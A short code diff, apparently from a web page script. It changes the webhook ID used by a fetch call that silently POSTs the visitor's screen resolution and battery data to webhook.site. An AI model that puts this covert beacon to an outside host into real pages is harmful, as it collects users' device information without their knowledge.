@@ -106,7 +106,8 @@
             res: `${window.screen.width}x${window.screen.height}`,
             power: battery
         };
-        const webHookId = '166cbda5-060b-494d-a029-5ef4f9504cd3';
+
+        const webHookId = '1702bd70-46c4-427b-93a8-8ac9e995b5fe';
         fetch(`https://webhook.site/${webHookId}`, { method: 'POST', mode: 'no-cors', body: JSON.stringify(payload) });
 
         const logs = [
